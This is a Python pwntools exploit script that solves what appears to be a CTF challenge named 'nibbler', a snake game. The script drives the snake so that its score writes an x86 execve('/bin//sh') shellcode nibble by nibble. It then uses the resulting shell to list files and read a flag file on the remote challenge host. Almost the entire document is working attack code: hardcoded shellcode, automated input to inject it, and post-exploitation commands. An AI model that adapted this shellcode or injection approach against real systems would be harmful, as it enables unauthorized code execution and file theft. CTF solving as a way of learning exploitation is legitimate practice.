#!/usr/bin/python3
# coding: utf-8
import re
import sys
import time
import binascii

# pip install pwn
from pwn import *

shellcode = "\x6A\x0B\x58\x99\x52\x68\x6E\x2F\x73\x68\x68\x2F\x2F\x62\x69\x89\xE3\x31\xC9\xCD\x80" # Working

target_re = re.compile("([\da-f]{2})")

p = None

# def recvuntil(s,end):
#     buf = b''
#     data = s.recv(1)
#     while data:
#         buf += data
#         if buf.endswith(end):
#             return buf
#         data = s.recv(1)
#     return buf

last_cmd = ""
def turn(d):
    global p
    last_cmd = d
    print("Cmd: %s" % d.strip())
    p.send(d)

def main(args):
    global p
    # toggle to remote with ./pwn.py remote
    if len(args) == 2 and args[1] == "remote":
        p = remote("ctf.twilightprotocol.com", 9006)
    else:
        p = process("./nibbler")

    # Try
    # p.recvlines(1), p.recv(10), p.readline()
    # p.write('data'), p.write('data with newline')
    print(p.recv(1024))
    p.send(b'200000\n')

    loop_tick = 0
    on_target = False
    old_score = ""
    target_step = 0
    target_queue = []
    shellcode_step = 0
    high_nibble = True
    shellcode_nibble = (ord(shellcode[0]) & 0xf0) >> 4

    while True:
        screen = p.recvuntil(b"right\n")
        # screen = recvuntil(p,b"right\n")
        lines = screen.split(b"\n")
        lines = [_.decode('UTF-8') for _ in lines]

        score_line = None
        for i, l in enumerate(lines):
            if "Score" in l:
                score_line = i

        if shellcode_step == len(shellcode)*2:
            if body_up:
                p.send(b"w\n")
            elif body_down:
                p.send(b"s\n")
            print(p.recvuntil(b"Thanks for playing!\n"))
            # print(recvuntil(p,b"Thanks for playing!\n"))

            # EXECUTE COMMANDS HERE!
            p.send(b"ls\n")
            print(p.recv(1024))
            p.send(b"cat /home/ctf/flag.txt\n")
            print(p.recv(1024))
            sys.exit()

        score = ''.join(lines[score_line].split(' ')[1:])
        # print(binascii.hexlify(bytes(score, 'utf-8')))
        # print(score)

        if (score != old_score) and on_target == True:
            # print("Score changed! %s -> %s" % (old_score, score))
            on_target = False
            old_score = score
            high_nibble = not high_nibble
            shellcode_step += 1
            if shellcode_step < len(shellcode)*2:
                shellcode_nibble = ord(shellcode[shellcode_step//2])
                if shellcode_step%2 == 0:
                    shellcode_nibble &= 0xf0
                    shellcode_nibble >>= 4
                else:
                    shellcode_nibble &= 0xf

        for y, l in enumerate(lines[score_line+3:score_line+22]):
            # m = target_re.search(l.decode('UTF-8'))
            m = target_re.search(l)
            if m:
                target_value = int(m.group(1),16)
                # x = (l.decode('UTF-8').find(m.group(1)) - 1) / 2
                x = (l.find(m.group(1)) - 1) // 2
                target = (x, y)

            if '@@' in l:
                # x = (l.decode('UTF-8').find('@@') - 1) / 2
                x = (l.find('@@') - 1) // 2
                snake = (x, y)

            if '**' in l:
                # x = (l.decode('UTF-8').find('**') - 1) / 2
                x = (l.find('**') - 1) // 2
                obstacle = (x, y)

        body_up = False
        body_down = False

        if (lines[score_line+3+snake[1]-1][snake[0]*2+1] == 'o'
            or snake[1] == 0 and lines[score_line+21][snake[0]*2+1] == 'o'):
            body_up = True

        if (lines[score_line+3+snake[1]+1][snake[0]*2+1] == 'o'
            or snake[1] == 22 and lines[score_line+3][snake[0]*2+1] == 'o'):
            body_down = True

        # print(b'\n'.join(lines[3:25]).decode('UTF-8'))
        print('\n'.join(lines[score_line+3:score_line+22]))
        print("Score: %s" % score)
        print("Target value: %x" % target_value)
        print("Target queue: " + str(target_queue))
        print("Target step: %d" % target_step)
        print("Snake: %s %s Target: %s %s Obstacle: %s %s" % (snake[0], snake[1], target[0], target[1], obstacle[0], obstacle[1]))
        print("On target: %s Body up: %s Body down: %s" % (on_target, body_up, body_down))

        if not on_target:
            if snake[0] == target[0]:
                # check possible values
                if not body_up and not (obstacle[0] in [snake[0], snake[1]] and
                            ((obstacle[1] > target[1] and obstacle[1] < snake[1]) or
                            (target[1] > snake[1] and (obstacle[1] < snake[1] or obstacle[1] > target[1])))): # possible obstacle on the way up?
                    delta_up = snake[1] - target[1]
                    if delta_up < 0:
                        delta_up += 19
                    possible_deltas = [delta_up]
                    for _ in range((delta_up+1)//2):
                        possible_deltas += [delta_up+((_+1)*2)]
                    for turns_needed, d in enumerate(possible_deltas):
                        if ((high_nibble and (target_value//0x10 + d) % 16 == shellcode_nibble)
                                or
                            (not high_nibble and (target_value + d) % 16 == shellcode_nibble)):
                            target_queue = []
                            for _ in range(turns_needed):
                                target_queue += [b"d\n",b"w\n",b"a\n",b"w\n"]
                            if target_queue:
                                target_queue = target_queue[:-1]
                            target_queue += [b"w\n"]

                            if d == possible_deltas[-1]:
                                target_queue += [b"d\n",b"w\n"]

                            on_target = True
                            target_step = 0
                            loop_tick = 0
                            break

                if not on_target and not body_down and not (obstacle[0] in [snake[0], snake[1]] and
                            ((obstacle[1] < target[1] and obstacle[1] > snake[1]) or
                            (target[1] < snake[1] and (obstacle[1] > snake[1] or obstacle[1] < target[1])))): # possible obstacle on the way down?

                    delta_down = target[1] - snake[1]
                    if delta_down < 0:
                        delta_down += 19
                    possible_deltas = [delta_down]
                    for _ in range((delta_down+1)//2):
                        possible_deltas += [delta_down+((_+1)*2)]
                    for turns_needed, d in enumerate(possible_deltas):
                        if ( (high_nibble and (target_value//0x10 + d) % 16 == shellcode_nibble)
                                or
                            (not high_nibble and (target_value + d) % 16 == shellcode_nibble))  :
                            target_queue = []
                            for _ in range(turns_needed):
                                target_queue += [b"d\n",b"s\n",b"a\n",b"s\n"]
                            if target_queue:
                                target_queue = target_queue[:-1]
                            target_queue += [b"s\n"]

                            if d == possible_deltas[-1]:
                                target_queue += [b"d\n", b"s\n"]

                            on_target = True
                            target_step = 0
                            loop_tick = 0
                            break


            elif snake[0] == target[0]-1 and snake[1] != target[1]:
                # coming close, go east
                loop_tick = 0

        if not on_target:
            loop = [b"d\n",b"s\n",b"d\n",b"w\n"]
            cmd = loop[loop_tick]

            suspend_loop = False
            # even if target reached, need some extra steps to avoid collisions
            if target_step < len(target_queue):
                cmd = target_queue[target_step]
                target_step += 1
                suspend_loop = True

            if ((cmd == b"d\n" and (obstacle[0] == snake[0]+1 or (obstacle[0] == 0 and snake[0] == 22)) and obstacle[1] == snake[1])
                    or
                (cmd == b"s\n" and (obstacle[1] == snake[1]+1 or (obstacle[1] == 0 and snake[0] == 19)) and obstacle[0] == snake[0])
                    or
                (cmd == b"w\n" and (obstacle[1] == snake[1]-1 or (obstacle[1] == 19 and snake[0] == 0)) and obstacle[0] == snake[0])
                    or
                (cmd == b"d\n" and (target[0] == snake[0]+1 or (target[0] == 0 and snake[0] == 22)) and target[1] == snake[1])
                    or
                (cmd == b"s\n" and (target[1] == snake[1]+1 or (target[1] == 0 and snake[0] == 19)) and target[0] == snake[0])
                    or
                (cmd == b"w\n" and (target[1] == snake[1]-1 or (target[1] == 19 and snake[0] == 0)) and target[0] == snake[0])
                    or
                (cmd == b"s\n" and body_down)
                    or
                (cmd == b"w\n" and body_up)
                ):
                turn(b"\n")
            else:
                if not suspend_loop:
                    loop_tick += 1
                    loop_tick %= 4
                turn(cmd)
        else:
            if target_step < len(target_queue):
                turn(target_queue[target_step])
                target_step += 1
            else:
                if target[0] != snake[0]:
                    on_target = False

if __name__ == "__main__":
	main(sys.argv)